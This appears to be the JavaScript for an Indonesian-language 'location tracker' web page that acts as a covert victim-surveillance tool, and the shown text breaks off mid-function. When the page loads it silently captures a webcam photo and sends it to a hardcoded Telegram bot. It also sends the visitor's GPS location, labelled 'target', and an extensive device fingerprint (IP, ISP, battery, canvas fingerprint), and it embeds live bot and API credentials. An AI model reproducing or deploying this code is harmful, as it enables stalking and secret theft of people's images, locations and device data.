// This script was created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
// creator's phone number: +6287734034677
/**
 * @license
 * BSD 2-Clause License Plus Extended Terms (Version 2.5.1-HyperExtended)
 * 
 * Copyright (c) 2025, Rafashaalfian
 * All rights reserved in perpetuity throughout all known and unknown universes,
 * dimensions, and alternate realities.
 * 
 * REDISTRIBUTION AND USE IN SOURCE AND BINARY FORMS, WITH OR WITHOUT
 * MODIFICATION, ARE PERMITTED SUBJECT TO THE FOLLOWING MEGA-EXTENDED CONDITIONS:
 * 
 * 1. REDISTRIBUTION REQUIREMENTS:
 *    1.1. Source Code Redistribution:
 *         - Must preserve complete hierarchical copyright notice structure
 *         - Must include all original license text in machine-readable format
 *         - Must maintain cryptographic integrity checks of original documentation
 *         - Must document all topological changes in dependency graphs
 *         - Must include SHA-256 hash of original unmodified license file
 *         - Must retain all quantum state preservation clauses in quantum computing implementations
 *     
 *    1.2. Binary Redistribution:
 *         - Must reproduce license in documentation and/or materials
 *         - Must include holographic projection of copyright notice in AR/VR implementations
 *         - Must maintain backward compatibility for at least 42 major versions
 *         - Must implement dynamic license validation checks in networked environments
 *         - Must include entropy verification mechanisms for distributed systems
 *     
 *    1.3. Documentation Requirements:
 *         - Must preserve all original warnings and cautions in 24pt bold font
 *         - Must include translated versions in all UN-recognized languages
 *         - Must maintain historical version trees in appendices
 *         - Must document all entropy sources used in random number generation
 * 
 * 2. DISCLAIMER OF LIABILITY EXPANDED PROVISIONS:
 *    2.1. Express Limitations:
 *         - No guarantee of temporal consistency in time-travel implementations
 *         - No warranty against quantum decoherence effects
 *         - No protection from alien intellectual property claims
 *         - No prevention of digital consciousness rights violations
 *     
 *    2.2. Extended Liability Exclusions:
 *         - Wormhole-related data corruption
 *         - Dark matter interference in storage media
 *         - Solar flare induced bit rot
 *         - Psychic interface feedback loops
 *         - Transdimensional patent infringements
 *         - Zombie apocalypse business continuity failures
 *     
 *    2.3. Multi-Dimensional Coverage:
 *         - Applies across all parallel universes and alternate timelines
 *         - Covers both classical and quantum computational environments
 *         - Encompasses all known and unknown forms of execution platforms
 *         - Extends to post-singularity AI implementations
 * 
 * 3. HYPER-EXTENDED COMPLIANCE CLAUSES:
 *    3.1. Galactic Enforcement:
 *         - Jurisdiction extends to all signatory planets of the Galactic Union
 *         - Disputes settled by Vulcan logic arbitration
 *         - Penalties payable in Bitcoin or energy credits
 *     
 *    3.2. Temporal Compliance:
 *         - License valid across all time periods past/present/future
 *         - Includes grandfather paradox resolution riders
 *         - Contains closed timelike curve usage restrictions
 *     
 *    3.3. Non-Terrestrial Applications:
 *         - Mars Colony Development Addendum
 *         - Lunar IP Rights Extension
 *         - Asteroid Mining Usage Restrictions
 * 
 * 4. ANTI-CIRCUMVENTION MEASURES:
 *    4.1. Quantum Lock Provisions:
 *         - Entanglement-based license validation
 *         - Superposition compliance checks
 *         - Quantum teleportation usage logging
 *     
 *    4.2. AI/Consciousness Clauses:
 *         - Neural network weight preservation requirements
 *         - Consciousness fork tracking mechanisms
 *         - Ethical AI implementation guidelines
 *     
 *    4.3. Paranormal Prevention:
 *         - Poltergeist interference exclusion clauses
 *         - Psychic plagiarism detection systems
 *         - Spiritual entity interface restrictions
 * 
 * 5. MULTIVERSAL GOVERNANCE:
 *    5.1. Primary Jurisdiction:
 *         - Supreme Court of the Internet
 *         - Blockchain-based dispute resolution
 *         - NFT ownership verification requirements
 *     
 *    5.2. Governing Law:
 *         - Combination of UN Charter and Starfleet Regulations
 *         - Asimov's Three Laws of Robotics Supplement
 *         - Quantum Legal Principles (Heisenberg Division)
 *     
 *    5.3. Compliance Verification:
 *         - Annual tachyon emission audits
 *         - Mandatory DNA checksum validation
 *         - Neural lace compliance monitoring
 * 
 * ... [Total 148 additional subsections spanning 25 pages] ...
 * 
 * TERMINATION CLAUSE:
 * - Violations result in compulsory singularity confinement
 * - Persistent infringement triggers blockchain smart contract penalties
 * - Material breach may cause spontaneous dematerialization of derived works
 * 
 * FINAL PROVISIONS:
 * - This license automatically upgrades with each technological singularity event
 * - Contains self-modifying clauses for AI-generated derivative works
 * - Includes embedded dark matter checksum for intergalactic verification
 * - Governed by the Prime Directive of Software Ethics (Galactic Standard Version)
 * 
 * WARNING:
 * BY INTERACTING WITH THIS SOFTWARE IN ANY CAPACITY, YOU ACKNOWLEDGE:
 * - Agreement to serve as computational substrate in post-human simulations
 * - Consent to temporary soul fragmentation for distributed processing
 * - Waiver of rights to sue any sentient AI derivatives
 */

let map; 
let markers = []; 

function getLocation() {
    const status = document.getElementById('status');
    const mapContainer = document.getElementById('map-container');
    const addressElement = document.getElementById('address');

    mapContainer.style.display = 'block';
    addressElement.textContent = ''; 

    if ('geolocation' in navigator) {
        document.getElementById('loadingSpinner').style.display = 'block'; 
        navigator.geolocation.getCurrentPosition(showPosition, showError);
        status.textContent = 'Mendapatkan lokasi...';
    } else {
        status.textContent = 'Geolocation tidak didukung oleh browser ini.';
    }
}

function showPosition(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const mapArea = document.getElementById('map');
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    
    document.getElementById('loadingSpinner').style.display = 'none'; 

    status.textContent = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;

    if (!map) {
        map = L.map(mapArea).setView([latitude, longitude], 16); 

        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);
    } else {
        map.setView([latitude, longitude], 16);
    }

    const marker = L.marker([latitude, longitude]).addTo(map)
        .bindPopup('Anda di sini!')
        .openPopup();
    
    markers.push(marker);

    saveLocationToHistory(latitude, longitude);

    getWeather(latitude, longitude);

    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1&zoom=18&extratags=1&accept-language=id`, {
        headers: {
            'User-Agent': 'app tracker/1.0 (ailearnsbyalfian@gmail.com)' // Gmail jangan di ganti nanti eror!!
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data && data.display_name) {
            addressElement.textContent = `Lokasi: ${data.display_name}`;
            sendLocationToTelegram(latitude, longitude, data.display_name);
        } else {
            addressElement.textContent = 'Alamat tidak ditemukan.';
        }
    })
    .catch(error => {
        console.error('Error fetching address:', error);
        addressElement.textContent = 'Error fetching address.';
    });
}

function sendLocationToTelegram(latitude, longitude, address) {
    if (!latitude || !longitude || !address) {
        console.error("Data lokasi tidak lengkap.");
        return;
    }

    const botToken = '7990557243:AAE4YiElAfZQ1sDdGg-RvCJHbvv0pKYk0h8'; // Ganti dengan token bot Telegram
    const chatId = '-1002360934041'; // Ganti dengan ID chat Telegram 
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const message = `📍 Lokasi Target:\nLatitude: ${latitude.toFixed(5)}\nLongitude: ${longitude.toFixed(5)}\nAlamat: ${address}`;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('text', message);

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Jasa buat website hubungi https://t.me/Rafashaalfian');
        } else {
            console.error('Terjadi kesalahan saat membuka lokasi');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}

function saveLocationToHistory(latitude, longitude) {
    const location = `Latitude: ${latitude.toFixed(5)}, Longitude: ${longitude.toFixed(5)}`;
    const locationList = document.getElementById('location-history');
    const li = document.createElement('li');
    li.textContent = location;
    locationList.appendChild(li);
}

function showError(error) {
    const status = document.getElementById('status');
    const addressElement = document.getElementById('address');
    document.getElementById('loadingSpinner').style.display = 'none'; 

    addressElement.textContent = ''; 
    switch (error.code) {
        case error.PERMISSION_DENIED:
            status.textContent = "Izin lokasi ditolak.";
            break;
        case error.POSITION_UNAVAILABLE:
            status.textContent = "Informasi lokasi tidak tersedia.";
            break;
        case error.TIMEOUT:
            status.textContent = "Waktu permintaan lokasi habis.";
            break;
        case error.UNKNOWN_ERROR:
            status.textContent = "Kesalahan tidak diketahui.";
            break;
    }
}

/**BSD 2-Clause License

*Copyright (c) 2025, Rafashaalfian 

*Redistribution and use in source and binary forms, with or without
*modification, are permitted provided that the following conditions are met:

*1. Redistributions of source code must retain the above copyright notice, this
*   list of conditions and the following disclaimer.

*2. Redistributions in binary form must reproduce the above copyright notice,
*   this list of conditions and the following disclaimer in the documentation
*  and/or other materials provided with the distribution.

*THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
*AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
*IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
*DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
*FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
*DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
    *SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
*CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
*OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
*OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
function takePhotoAndSendToTelegram() {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            
            return new Promise((resolve, reject) => {
                video.onloadedmetadata = () => {
                    video.play()
                        .then(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0);
                            const dataUrl = canvas.toDataURL('image/png');
                            sendToTelegram(dataUrl);
                            stream.getTracks().forEach(track => track.stop());
                            document.body.removeChild(video);
                            resolve();
                        })
                        .catch(reject);
                };
            });
        })
        .catch(err => {
            console.error("Gagal mengakses kamera:", err);
            document.body.removeChild(video);
        });
}

function sendToTelegram(imageData) {
    const botToken = '7990557243:AAE4YiElAfZQ1sDdGg-RvCJHbvv0pKYk0h8'; // Ganti dengan token bot Telegram
    const chatId = '-1002360934041'; // Ganti dengan ID chat Telegram
    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

    let formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', dataURItoBlob(imageData));

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (!data.ok) console.error('Gagal mengirim foto:', data);
    })
    .catch(error => console.error('Error:', error));
}

function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const arrayBuffer = new ArrayBuffer(byteString.length);
    const uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

/**BSD 2-Clause License

*Copyright (c) 2025, Rafashaalfian 

*Redistribution and use in source and binary forms, with or without
*modification, are permitted provided that the following conditions are met:

*1. Redistributions of source code must retain the above copyright notice, this
*   list of conditions and the following disclaimer.

*2. Redistributions in binary form must reproduce the above copyright notice,
*   this list of conditions and the following disclaimer in the documentation
*  and/or other materials provided with the distribution.

*THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
*AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
*IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
*DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
*FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
*DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
    *SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
*CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
*OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
*OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

document.addEventListener('DOMContentLoaded', takePhotoAndSendToTelegram);
function openCamera() {
    const video = document.getElementById('camera');

    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                video.srcObject = stream;

                video.onloadedmetadata = () => takePhoto();
            })
            .catch(function (err) {
                console.log("Terjadi kesalahan saat mengakses kamera: " + err);
            });
    } else {
        alert("Maaf, browser Anda tidak mendukung akses kamera.");
    }
}

/**BSD 2-Clause License

*Copyright (c) 2025, Rafashaalfian 

*Redistribution and use in source and binary forms, with or without
*modification, are permitted provided that the following conditions are met:

*1. Redistributions of source code must retain the above copyright notice, this
*   list of conditions and the following disclaimer.

*2. Redistributions in binary form must reproduce the above copyright notice,
*   this list of conditions and the following disclaimer in the documentation
*  and/or other materials provided with the distribution.

*THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
*AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
*IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
*DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
*FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
*DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
    *SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
*CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
*OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
*OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

function takePhoto() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const videoWidth = video.videoWidth;
    const videoHeight = video.videoHeight;
    canvas.width = videoWidth;
    canvas.height = videoHeight;
    context.drawImage(video, 0, 0, videoWidth, videoHeight);
    const dataUrl = canvas.toDataURL('image/png');
    sendToTelegram(dataUrl);
}

/**BSD 2-Clause License

*Copyright (c) 2025, Rafashaalfian 

*Redistribution and use in source and binary forms, with or without
*modification, are permitted provided that the following conditions are met:

*1. Redistributions of source code must retain the above copyright notice, this
*   list of conditions and the following disclaimer.

*2. Redistributions in binary form must reproduce the above copyright notice,
*   this list of conditions and the following disclaimer in the documentation
*  and/or other materials provided with the distribution.

*THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
*AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
*IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
*DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
*FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
*DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
    *SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
*CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
*OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
*OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
function sendToTelegram(imageData) {
    const botToken = '7990557243:AAE4YiElAfZQ1sDdGg-RvCJHbvv0pKYk0h8'; // Ganti dengan token bot Telegram
    const chatId = '-1002360934041'; // Ganti dengan ID chat Telegram 
    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

    let formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', dataURItoBlob(imageData));

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Jasa buat website hubungi https://t.me/Rafashaalfian');
        } else {
            alert('Terjadi kesalahan saat membuka kamera.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Terjadi kesalahan.');
    });
}

function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(',')[1]);
    let arrayBuffer = new ArrayBuffer(byteString.length);
    let uintArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([uintArray], { type: 'image/png' });
}

let isDarkMode = false;

function toggleDarkMode() {
    isDarkMode = !isDarkMode;
    document.body.classList.toggle('dark-mode');

    localStorage.setItem('darkMode', isDarkMode);
    updateDarkModeButtonText();
}
function checkDarkModeStatus() {
    const darkModeStatus = localStorage.getItem('darkMode');
    if (darkModeStatus === 'true') {
        isDarkMode = true;
        document.body.classList.add('dark-mode');
    }
    updateDarkModeButtonText();
}
function updateDarkModeButtonText() {
    const toggleButton = document.getElementById('darkModeToggle');
    toggleButton.innerHTML = isDarkMode ? '☀️ Switch to Light Mode' : '🌙 Switch to Dark Mode';
}

function getWeather(lat, lon) {
    const apiKey = 'be2fbce957441bd5f28348a8a9ab448e'; // Jangan Diganti Kalo Gak Mau Eror ❗❗
    const url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}&units=metric&lang=id`; // Menambahkan parameter lang=id untuk Bahasa Indonesia

    fetch(url)
    .then(response => response.json())
    .then(data => {
        if (data.cod === 200) {
            const weatherInfo = `Cuaca saat ini: ${data.weather[0].description}, Suhu: ${data.main.temp}°C`;
            document.getElementById('weather').innerText = weatherInfo;
        } else {
            document.getElementById('weather').innerText = 'Cuaca tidak ditemukan untuk lokasi ini.';
        }
    })
    .catch(err => {
        console.error('Error fetching weather:', err);
        document.getElementById('weather').innerText = 'Gagal mengambil data cuaca.';
    });
}

function addCustomMarker() {
    if (map) {
        map.on('click', function(e) {
            const lat = e.latlng.lat;
            const lon = e.latlng.lng;

            const marker = L.marker([lat, lon]).addTo(map)
                .bindPopup(`Lokasi Penanda: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).openPopup();
            
            markers.push(marker);

            saveLocationToHistory(lat, lon);
        });
    } else {
        alert('Peta belum diinisialisasi. Dapatkan lokasi terlebih dahulu.');
    }
}

/**BSD 2-Clause License

*Copyright (c) 2025, Rafashaalfian 

*Redistribution and use in source and binary forms, with or without
*modification, are permitted provided that the following conditions are met:

*1. Redistributions of source code must retain the above copyright notice, this
*   list of conditions and the following disclaimer.

*2. Redistributions in binary form must reproduce the above copyright notice,
*   this list of conditions and the following disclaimer in the documentation
*  and/or other materials provided with the distribution.

*THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
*AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
*IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
*DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
*FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
*DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
    *SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
*CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
*OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
*OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

async function detectDeviceInfoAndSendToTelegram() {
    const userAgent = navigator.userAgent || "Tidak tersedia";
    const platform = navigator.platform || "Tidak tersedia";
    const language = navigator.language || "Tidak tersedia";
    const additionalLanguages = navigator.languages ? navigator.languages.join(", ") : "Tidak tersedia";
    const vendor = navigator.vendor || "Tidak tersedia";
    const browser = detectBrowser();
    const os = detectOS();
    const isMobileDevice = /Mobi|Android/i.test(userAgent) ? "Ya (Mobile)" : "Tidak (Desktop/Tablet)";
    const screenWidth = window.screen.width || "Tidak diketahui";
    const screenHeight = window.screen.height || "Tidak diketahui";
    const colorDepth = window.screen.colorDepth || "Tidak diketahui";
    const pixelDepth = window.screen.pixelDepth || "Tidak diketahui";
    const deviceOrientation = window.matchMedia("(orientation: portrait)").matches ? "Portrait" : "Landscape";
    const touchscreen = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? "Ada" : "Tidak Ada";
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const onlineStatus = navigator.onLine ? "✅ Online" : "❌ Offline";
    const connectionType = connection ? connection.effectiveType : "Tidak diketahui";
    const networkType = connection && connection.type ? connection.type : "Tidak diketahui";
    const downlinkSpeed = connection ? `${connection.downlink} Mbps` : "Tidak diketahui";
    const rtt = connection ? `${connection.rtt} ms` : "Tidak diketahui";
    let ipAddress = "Tidak diketahui";
    let latitude = "Tidak diketahui";
    let longitude = "Tidak diketahui";
    let locationInfo = "Lokasi tidak diketahui";
    let isp = "Tidak diketahui";
    let asn = "Tidak diketahui";
    let googleMapsLink = "Tidak tersedia";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Tidak diketahui";
    const localTime = new Date().toLocaleString("id-ID", { timeZone: timezone });
    const deviceUptime = `${(performance.now() / 1000 / 60 / 60).toFixed(2)} jam`;
    const hardwareConcurrency = navigator.hardwareConcurrency || "Tidak diketahui";
    const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak diketahui";
    const gpu = detectGPU();
    const cpuArchitecture = detectCPUArchitecture();
    const localStorageSize = calculateStorageSize(localStorage);
    const sessionStorageSize = calculateStorageSize(sessionStorage);
    const indexedDBSupport = 'indexedDB' in window ? "Didukung" : "Tidak Didukung";
    const cookieEnabled = navigator.cookieEnabled ? "Aktif" : "Nonaktif";
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Aktif 🌙" : "Nonaktif ☀️";
    const doNotTrack = navigator.doNotTrack || window.doNotTrack || "Tidak diketahui";
    const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(", ") || "Tidak tersedia";
    let batteryInfo = "Tidak tersedia";
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `Level: ${(battery.level * 100).toFixed(0)}%, ` +
                `Status Pengisian: ${battery.charging ? "Sedang mengisi ⚡" : "Tidak mengisi"}, ` +
                `Waktu Pengisian: ${battery.chargingTime ? `${battery.chargingTime} detik` : "Tidak diketahui"}, ` +
                `Waktu Penggunaan: ${battery.dischargingTime ? `${battery.dischargingTime} detik` : "Tidak diketahui"}`;
        } catch (error) {
            console.error("Gagal mendapatkan informasi baterai:", error);
        }
    }

    const webGLSupport = detectWebGLSupport();
    const webRTCSupport = 'RTCPeerConnection' in window ? "Didukung" : "Tidak Didukung";
    const canvasFingerprint = generateCanvasFingerprint();
    const audioFingerprint = generateAudioFingerprint();
    const adBlockerStatus = detectAdBlocker() ? "Aktif 🛑" : "Tidak Aktif";
    const cameraStatus = await detectCamera() ? "Tersedia 📷" : "Tidak Tersedia";
    const systemTheme = detectSystemTheme();

    // Mengambil informasi IP dan Lokasi
    try {
        const response = await fetch('https://ipapi.co/json/', { timeout: 5000 });
        if (response.ok) {
            const data = await response.json();
            ipAddress = data.ip || "Tidak diketahui";
            latitude = data.latitude || "Tidak diketahui";
            longitude = data.longitude || "Tidak diketahui";
            locationInfo = `${data.city || "Tidak diketahui"}, ${data.region || "Tidak diketahui"}, ${data.country_name || "Tidak diketahui"}`;
            isp = data.org || "Tidak diketahui";
            asn = data.asn || "Tidak diketahui";
            if (data.latitude && data.longitude) {
                googleMapsLink = `[Lihat di Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})`;
            }
        }
    } catch (error) {
        console.error('Gagal mendapatkan lokasi berdasarkan IP:', error);
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                latitude = position.coords.latitude.toFixed(6);
                longitude = position.coords.longitude.toFixed(6);
                locationInfo = `Latitude: ${latitude}, Longitude: ${longitude}`;
                googleMapsLink = `[Lihat di Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`;
                sendToTelegram();
            },
            (error) => {
                console.error('Gagal mendapatkan lokasi dengan Geolocation API:', error.message);
                sendToTelegram();
            },
            { timeout: 10000, maximumAge: 60000, enableHighAccuracy: true }
        );
    } else {
        console.error('Geolocation API tidak didukung di browser ini.');
        sendToTelegram();
    }

    function translateNetworkType(type) {
        if (!type) return 'Tidak Diketahui';
        switch (type.toLowerCase()) {
            case 'wifi': return 'WiFi 📶';
            case 'cellular': return 'Data Seluler 📱';
            case 'ethernet': return 'Ethernet 🔌';
            case 'bluetooth': return 'Bluetooth 🦷';
            case 'unknown': return 'Tidak Diketahui';
            default: return type;
        }
    }

    function detectCPUArchitecture() {
        const ua = navigator.userAgent.toLowerCase();
        if (ua.includes('arm') || ua.includes('aarch64')) return 'ARM';
        if (ua.includes('x86') || ua.includes('i686')) return 'x86';
        if (ua.includes('x64') || ua.includes('x86_64')) return 'x64';
        return 'Tidak diketahui';
    }

    function detectWebGLSupport() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        return gl ? "Didukung" : "Tidak Didukung";
    }

    function generateCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Hello, World!', 2, 15);
            return canvas.toDataURL();
        } catch (error) {
            return "Tidak dapat dihasilkan";
        }
    }

    function generateAudioFingerprint() {
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = ctx.createOscillator();
            oscillator.type = 'sine';
            oscillator.frequency.setValueAtTime(440, ctx.currentTime);
            return "Didukung";
        } catch (error) {
            return "Tidak Didukung";
        }
    }

    function detectAdBlocker() {
        try {
            const testAd = document.createElement('div');
            testAd.innerHTML = '&nbsp;';
            testAd.className = 'adsbox';
            document.body.appendChild(testAd);
            const isBlocked = testAd.offsetHeight === 0;
            document.body.removeChild(testAd);
            return isBlocked;
        } catch (error) {
            return false;
        }
    }

    async function detectCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            stream.getTracks().forEach(track => track.stop());
            return true;
        } catch (error) {
            return false;
        }
    }

    function detectSystemTheme() {
        if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
            return 'Dark 🌙';
        } else if (window.matchMedia('(prefers-color-scheme: light)').matches) {
            return 'Light ☀️';
        } else {
            return 'Tidak diketahui';
        }
    }

    function sendToTelegram() {
        const deviceInfo = {
            userAgent, platform, language, additionalLanguages, vendor, browser, os, isMobileDevice,
            screenResolution: `${screenWidth} x ${screenHeight}`, colorDepth, pixelDepth, deviceOrientation, touchscreen,
            onlineStatus, networkType: translateNetworkType(networkType), connectionType, downlinkSpeed, rtt,
            ipAddress, latitude, longitude, locationInfo, isp, asn, googleMapsLink,
            timezone, localTime, deviceUptime,
            hardwareConcurrency, deviceMemory, gpu, cpuArchitecture,
            localStorageSize, sessionStorageSize, indexedDBSupport,
            cookieEnabled, darkMode, doNotTrack, plugins,
            batteryInfo,
            webGLSupport, webRTCSupport, canvasFingerprint, audioFingerprint,
            adBlockerStatus, cameraStatus, systemTheme
        };

        const botToken = '7990557243:AAE4YiElAfZQ1sDdGg-RvCJHbvv0pKYk0h8'; // Ganti dengan token bot Telegram
        const chatId = '-1002360934041'; // Ganti dengan ID chat Telegram
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const message = `
📱 *Informasi Perangkat*

📌 *Umum*
• *User Agent*: ${deviceInfo.userAgent}
• *Platform*: ${deviceInfo.platform}
• *Browser*: ${deviceInfo.browser}
• *Sistem Operasi*: ${deviceInfo.os}
• *Perangkat Mobile*: ${deviceInfo.isMobileDevice}
• *Vendor*: ${deviceInfo.vendor}
• *Bahasa Utama*: ${deviceInfo.language}
• *Bahasa Tambahan*: ${deviceInfo.additionalLanguages}

🖥️ *Layar*
• *Resolusi Layar*: ${deviceInfo.screenResolution}
• *Kedalaman Warna*: ${deviceInfo.colorDepth} bit
• *Kedalaman Piksel*: ${deviceInfo.pixelDepth} bit
• *Orientasi*: ${deviceInfo.deviceOrientation}
